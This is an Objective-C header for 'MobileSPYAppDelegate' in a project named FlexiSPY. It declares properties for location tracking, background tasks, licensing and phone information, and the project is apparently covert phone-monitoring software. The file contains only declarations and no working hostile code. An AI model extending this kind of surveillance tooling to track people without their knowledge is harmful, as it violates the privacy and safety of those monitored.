//
//  MobileSPYAppDelegate.h
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import <CoreLocation/CoreLocation.h>

#import "AppEngineDelegate.h"

@class AppUIConnection;
@class LicenseInfo;
@class ConfigurationManagerImpl;
@class PhoneInfoImp;
@class AppEngine;
@class BackgroundTask, CLLocationManager;

@protocol PhoneInfo;
@protocol ConfigurationManager;

@interface MobileSPYAppDelegate : NSObject <UIApplicationDelegate, CLLocationManagerDelegate, AppEngineDelegate> {
    
    UIWindow *window;
    UINavigationController *navigationController;
	
@private
	AppUIConnection	*mAppUIConnection;
	LicenseInfo		*mLicenseInfo;
	ConfigurationManagerImpl *mConfigurationManager;
	PhoneInfoImp	*mPhoneInfo;
    AppEngine *mAppEngine;
    BackgroundTask *mBackgroundTask;
    CLLocationManager *mLocationManager;
    
    BOOL mShowActivateWizard;
    UIBackgroundTaskIdentifier mAppEngineBG;
}


@property (nonatomic, retain) IBOutlet UIWindow *window;
@property (nonatomic, retain) IBOutlet UINavigationController *navigationController;

@property (nonatomic, readonly) AppUIConnection *mAppUIConnection;
@property (nonatomic, retain) LicenseInfo *mLicenseInfo;
@property (nonatomic, readonly) id <ConfigurationManager> mConfigurationManager;
@property (nonatomic, readonly) id <PhoneInfo> mPhoneInfo;
@property (nonatomic, retain) AppEngine *mAppEngine;
@property (nonatomic, retain) CLLocationManager *mLocationManager;

@property (nonatomic, assign) BOOL mShowActivateWizard;
@end

